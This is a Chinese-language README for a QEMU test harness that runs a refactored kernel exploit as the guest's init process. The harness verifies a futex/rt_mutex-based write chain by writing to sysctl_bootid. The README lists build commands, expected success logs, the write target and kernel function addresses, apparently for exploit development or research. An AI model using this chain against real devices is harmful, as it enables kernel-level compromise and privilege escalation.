# QEMU 验证器具（kernel.patched）

把重构后的 exploit 直接作为 QEMU guest 的 `/init` 跑 `--verify-write`，
无需真机即可验证整条链（EDEADLK → MCAST 载体 → sched_setattr → boot_id 校验）。

```sh
./build_and_run.sh          # 交叉编译 + 打包 initramfs + 启动 QEMU(-gdb/:1234)
# 另开一个终端：
./read_log.py               # QMP pmemsave 导出 RAM，打印 exploit 日志
```

TCG 模拟下 guest 启动 + 跑完 exploit 需要几分钟，`read_log.py` 每 15s
重新 dump 一次，直到日志出现（默认最多等 300s，可用 `--wait N` 调整）。

期望输出（节选）：

```text
... [+] slide boot_id raw=...2023410b80ffffff lo=0 hi=ffffff800b412320 expected_hi=ffffff800b412320 write_ok=1
... [*] slide attempt 1 ok=1 ... requeue=-1/35 trigger=0/0 wait=-1/110 carrier=-1/22
... [+] slide write test PASSED
```

说明：

- `init_wrapper.c` 会挂载 `/proc`、给 fd 0/1/2 补 `/dev/null`（QEMU 无控制台，
  否则 `pipe()` 会占用 fd 0/1）、创建 `/data/local/tmp` 后 exec exploit。
- `carrier=-1/22`（EINVAL）是预期的：拷贝完成后 `ip_mc_source` 因假地址组失败；
  拷贝本身已发生（`write_ok=1` 即证明）。
- 写目标为 `sysctl_bootid + 8`：`proc_do_uuid()` 在 `bootid[8]==0` 时会重新生成
  UUID，写低 8 字节会被验证读覆盖。
- QEMU 使用 `nokaslr` + `--kaslr-base 0xffffff8008080800`；
  需要 GDB 观测时 attach `:1234`（rt_mutex_adjust_prio_chain @ 0xffffff8008162d70、
  rt_mutex_adjust_pi @ 0xffffff8008162c58、do_futex @ 0xffffff80081a5248）。
